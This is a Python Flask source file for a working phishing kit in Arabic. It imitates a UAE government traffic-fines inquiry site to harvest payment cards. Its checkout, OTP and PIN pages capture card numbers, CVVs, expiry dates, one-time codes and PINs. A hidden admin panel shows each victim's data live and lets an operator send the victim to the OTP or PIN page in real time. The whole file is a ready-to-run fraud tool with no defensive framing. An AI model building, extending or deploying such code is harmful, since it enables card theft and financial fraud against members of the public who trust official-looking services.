import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات وهمية في الذاكرة
db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- الهيدر الرسمي الموحد (تصميم عريض) ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<div style="background:white; padding:20px 30px; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center; font-family:sans-serif;">
    <div style="display:flex; align-items:center; gap:25px; color:#555; font-size:20px;">
        <span style="font-weight:bold; color:#333; cursor:pointer;">EN | دخول</span>
        <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-question-circle"></i>
    </div>
    <div style="display:flex; gap:15px;">
        <div style="background:#b0914f; color:white; padding:12px 20px; border-radius:6px; font-size:20px;"><i class="fa fa-bars"></i></div>
    </div>
</div>
<div style="background:white; text-align:center; padding:20px 0; border-bottom:3px solid #b0914f;">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; max-width:800px;">
</div>
'''

# --- 1. الصفحة الرئيسية ---
@app.route('/')
def index():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><body style="margin:0; font-family:sans-serif;">
        <div style="max-width:1000px; margin:0 auto; position:relative;">
            <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg" style="width:100%;">
            <button onclick="location.href='/search'" style="position:absolute; top:350px; left:10%; width:80%; height:100px; background:transparent; border:none; cursor:pointer;"></button>
        </div>
    </body></html>
    '''
    return render_template_string(html)

# --- 2. صفحة الاستعلام (التبويبات الشغالة كاملة) ---
@app.route('/search')
def search():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{background:#f7f8fa; margin:0; font-family:sans-serif;}
        .main-card{background:white; width:95%; max-width:900px; margin:40px auto; border-top:8px solid #b0914f; padding:40px; box-shadow:0 10px 30px rgba(0,0,0,0.08); border-radius:0 0 15px 15px;}
        .tabs-container{display:flex; justify-content:center; gap:10px; margin-bottom:30px; border-bottom:1px solid #ddd; padding-bottom:15px;}
        .tab-btn{padding:15px 25px; border:1px solid #ddd; background:#f9f9f9; cursor:pointer; font-weight:bold; font-size:16px; border-radius:8px; transition:0.3s; color:#666; flex:1; text-align:center;}
        .tab-btn.active{background:#b0914f; color:white; border-color:#b0914f;}
        label{display:block; margin:15px 0 8px; font-weight:bold; color:#333; font-size:18px;}
        select, input{width:100%; padding:20px; border:1px solid #ccc; border-radius:8px; margin-bottom:20px; font-size:18px; outline:none; background:#fafafa; box-sizing:border-box;}
        .btn-search{width:100%; padding:25px; background:#b0914f; color:white; border:none; font-size:22px; font-weight:bold; cursor:pointer; border-radius:8px;}
        .content-section{display:none;} .content-section.active{display:block;}
    </style></head>
    <body>
        <div class="main-card">
            <h1 style="color:#b0914f; text-align:center;">الاستعلام عن المخالفات</h1>
            <div class="tabs-container">
                <div class="tab-btn active" onclick="openTab(event, 'plate-tab')">بيانات اللوحة</div>
                <div class="tab-btn" onclick="openTab(event, 'tc-tab')">الرمز المروري</div>
                <div class="tab-btn" onclick="openTab(event, 'license-tab')">بيانات الرخصة</div>
            </div>
            <div id="plate-tab" class="content-section active">
                <label>الإمارة</label>
                <select><option>أبوظبي</option><option>دبي</option><option>الشارقة</option><option>عجمان</option><option>أم القيوين</option><option>رأس الخيمة</option><option>الفجيرة</option></select>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
                    <div><label>مصدر اللوحة</label><select><option>خصوصي</option><option>تجاري</option></select></div>
                    <div><label>فئة اللوحة</label><input placeholder="1"></div>
                </div>
                <label>رقم اللوحة</label><input placeholder="12345">
            </div>
            <div id="tc-tab" class="content-section">
                <label>الرمز المروري (T.C)</label><input placeholder="أدخل 8 أرقام">
            </div>
            <div id="license-tab" class="content-section">
                <label>رقم الرخصة</label><input placeholder="أدخل رقم رخصة القيادة">
            </div>
            <button onclick="location.href='/checkout'" class="btn-search">بدء الاستعلام</button>
        </div>
        <script>
            function openTab(evt, tabId) {
                let s = document.getElementsByClassName("content-section");
                for (let i=0; i<s.length; i++) s[i].classList.remove("active");
                let t = document.getElementsByClassName("tab-btn");
                for (let i=0; i<t.length; i++) t[i].classList.remove("active");
                document.getElementById(tabId).classList.add("active");
                evt.currentTarget.classList.add("active");
            }
        </script>
    </body></html>
    '''
    return render_template_string(html)

# --- 3. صفحة الدفع (العملاقة المصلحة) ---
@app.route('/checkout')
def checkout():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{background:#f4f6f8; font-family:sans-serif; margin:0;}
        .pay-container{max-width:850px; margin:40px auto; padding:20px;}
        .pay-box{background:white; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.1); padding:50px;}
        .v-header{background:#b0914f; color:white; padding:25px; border-radius:15px 15px 0 0; text-align:center; margin:-50px -50px 40px -50px; font-size:24px; font-weight:bold;}
        input, select{width:100%; padding:22px; margin-bottom:25px; border:1.5px solid #ddd; border-radius:12px; outline:none; font-size:20px; box-sizing:border-box;}
        .btn-pay{width:100%; padding:25px; background:#b0914f; color:white; border:none; border-radius:12px; font-size:24px; font-weight:bold; cursor:pointer;}
        .logos img{height:45px; opacity:0.3; transition:0.3s; margin:0 10px;}
        .active-logo{opacity:1 !important; transform:scale(1.2);}
    </style></head>
    <body>
        <div class="pay-container"><div class="pay-box">
            <div class="v-header">بوابة الدفع الآمنة 2026</div>
            <div class="logos" style="text-align:center; margin-bottom:30px;">
                <img id="v-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
                <img id="m-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
            </div>
            <form action="/submit-card" method="POST">
                <input name="card" id="c_num" placeholder="رقم البطاقة" maxlength="19" required>
                <div style="display:flex; gap:20px;">
                    <select name="exp_m" required>
                        <option value="">الشهر</option>
                        {% for m in range(1, 13) %}<option>{{ "%02d"|format(m) }}</option>{% endfor %}
                    </select>
                    <select name="exp_y" required>
                        <option value="">السنة</option>
                        {% for y in range(2026, 2037) %}<option>{{ y }}</option>{% endfor %}
                    </select>
                </div>
                <div style="display:flex; gap:20px;">
                    <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                    <input name="holder" placeholder="اسم صاحب البطاقة" style="flex:3;" required>
                </div>
                <button type="submit" class="btn-pay">دفع الرسوم الآن</button>
            </form>
        </div></div>
        <script>
            document.getElementById('c_num').addEventListener('input', e => {
                let v = e.target.value.replace(/\\s/g, '');
                document.getElementById('v-logo').className = v.startsWith('4') ? 'active-logo' : '';
                document.getElementById('m-logo').className = v.startsWith('5') ? 'active-logo' : '';
                e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
            });
        </script>
    </body></html>
    '''
    return render_template_string(html)

# --- 4. صفحات OTP و PIN (التصميم العملاق) ---
@app.route('/otp')
def otp():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><style>
        body{margin:0; background:#f0f2f5; font-family:sans-serif; display:flex; flex-direction:column; min-height:100vh;}
        .wrap{flex:1; display:flex; justify-content:center; align-items:center;}
        .modal{background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; box-shadow:0 30px 60px rgba(0,0,0,0.2); text-align:center; border-top:10px solid #b0914f;}
        input{width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold;}
        .btn{width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;}
    </style></head>
    <body><div class="wrap"><div class="modal">
        <h1>تأكيد رمز التحقق</h1>
        <p style="font-size:22px; color:#666; margin-bottom:40px;">أدخل رمز الـ OTP المرسل لهاتفك</p>
        <form action="/submit-card" method="POST"><input name="otp" maxlength="6" required autofocus><button class="btn">تأكيد واعتماد السداد</button></form>
    </div></div></body></html>
    '''
    return render_template_string(html)

@app.route('/pin')
def pin():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><style>
        body{margin:0; background:#f0f2f5; font-family:sans-serif; display:flex; flex-direction:column; min-height:100vh;}
        .wrap{flex:1; display:flex; justify-content:center; align-items:center;}
        .modal{background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; box-shadow:0 30px 60px rgba(0,0,0,0.2); text-align:center; border-top:10px solid #b0914f;}
        input{width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold;}
        .btn{width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;}
    </style></head>
    <body><div class="wrap"><div class="modal">
        <h1>الرقم السري للبطاقة</h1>
        <p style="font-size:22px; color:#666; margin-bottom:40px;">يرجى إدخال رقم الـ PIN المكون من 4 أرقام</p>
        <form action="/submit-card" method="POST"><input name="pin" type="password" maxlength="4" required autofocus><button class="btn">إرسال البيانات</button></form>
    </div></div></body></html>
    '''
    return render_template_string(html)

# --- 5. لوحة التحكم (VIP CARD UI) ---
@app.route('/h-admin')
def admin():
    return render_template_string('''
    <html lang="ar" dir="rtl"><head><style>
        body{background:#0a0a0a; color:#fff; font-family:sans-serif; padding:40px;}
        .card-ui {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            width:450px; height:260px; border-radius:25px; padding:30px; position:relative; margin:20px; display:inline-block; box-shadow:0 10px 30px rgba(0,0,0,0.5);
        }
        .c-num{font-size:32px; letter-spacing:4px; margin-top:80px; text-shadow:2px 2px 4px #000;}
        .admin-box{background:#1a1a1a; padding:20px; border-radius:0 0 25px 25px; width:470px; margin-left:20px; margin-top:-30px; border:1px solid #333;}
        .btn-act{padding:18px; border:none; border-radius:12px; cursor:pointer; font-weight:bold; width:48%; margin:1%; font-size:16px;}
    </style></head>
    <body>
        <h1>لوحة تحكم الصياد 2026 👮‍♂️</h1>
        <div id="logs"></div>
        <script>
            function refresh(){
                fetch('/get-logs').then(r=>r.json()).then(data=>{
                    let h = '';
                    for(let id in data.sessions){
                        let s = data.sessions[id];
                        h += `<div>
                            <div class="card-ui">
                                <div style="position:absolute; top:30px; right:30px; font-size:20px;">CVV: ${s.cvv}</div>
                                <div class="c-num">${s.card}</div>
                                <div style="margin-top:40px; font-size:20px;">${s.holder}</div>
                                <div style="position:absolute; bottom:30px; right:30px; font-size:20px;">${s.exp_m}/${s.exp_y}</div>
                            </div>
                            <div class="admin-box">
                                <div style="color:#0f0; font-size:26px; text-align:center; margin-bottom:20px;">
                                    OTP: ${s.otp || '---'} | PIN: ${s.pin || '---'}
                                </div>
                                <button class="btn-act" style="background:#27ae60; color:white;" onclick="act('go_otp')">طلب OTP</button>
                                <button class="btn-act" style="background:#2980b9; color:white;" onclick="act('go_pin')">طلب PIN</button>
                                <button class="btn-act" style="background:#c0392b; color:white; width:98%; margin-top:10px;" onclick="act('error_card','البيانات مرفوضة')">رفض البطاقة</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('logs').innerHTML = h;
                });
            }
            function act(st, msg=''){ fetch('/set-status/'+st+'?msg='+msg); }
            setInterval(refresh, 2000); refresh();
        </script>
    </body></html>
    ''')

# --- الجزء الخلفي (الباكيند) ---
@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    else: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string('''<script>setInterval(()=>{fetch("/check-status").then(r=>r.json()).then(d=>{if(d.status==="go_otp")location.href="/otp";if(d.status==="go_pin")location.href="/pin";if(d.status==="error_card"){alert(d.msg);location.href="/checkout";}});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;"><h2>جاري معالجة طلبك بأمان...</h2></body>''')

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; db['msg'] = request.args.get('msg', ''); return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
